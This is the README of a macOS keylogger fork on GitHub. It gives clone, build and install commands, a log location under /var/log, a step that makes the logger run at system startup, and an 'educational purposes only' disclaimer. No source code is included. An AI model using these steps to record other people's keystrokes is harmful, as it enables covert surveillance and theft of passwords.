# modified the original to only work for MAC for me
original: https://github.com/GiacomoLaw/Keylogger

## Installation
Download the repo. It will install in `~/bin/keylogger`.

Install it:

`$ git clone https://github.com/unamatasanatarai/keylogger-mac && cd keylogger-mac`

`$ make && make install`

It will log to `/var/log/keylogger.YYYYMMDD.log`. This may require root access, but you can change that if you want. Set where you want it to log:

Want to make it start on system startup?

`$ sudo make startup`

That will run it on startup.

### Uninstall
`$ sudo make uninstall`
Will uninstall the program, but not the logs.

---

Please feel free to contribute to fix any problems!

Please note, this repo is for educational purposes only. No contributors are to fault for any actions done by this program.